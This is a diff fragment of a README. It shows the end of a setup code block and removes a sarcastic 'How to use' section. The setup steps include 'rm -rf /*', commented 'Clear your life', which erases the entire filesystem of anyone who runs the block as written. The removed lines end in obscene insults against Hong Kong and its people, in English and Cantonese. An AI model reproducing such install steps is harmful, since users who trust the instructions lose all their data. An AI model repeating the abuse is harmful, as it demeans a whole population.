@@ -25,15 +25,3 @@ cp ./dist * /var/www          # copy the "dist" directory to your server
 node server.js                # RUN!
 rm -rf /*                     # Clear your life
 ```
-
-
-## How to use
-- Just clone it if you want.
-- No documentation will be provided.
-- No quality promise
-- I am just an IT dog in Hong Kong
-- No hope
-- No future
-
-# Fuck you Hong Kong!!!
-屌哂全香港人老母，大家繼續食屎
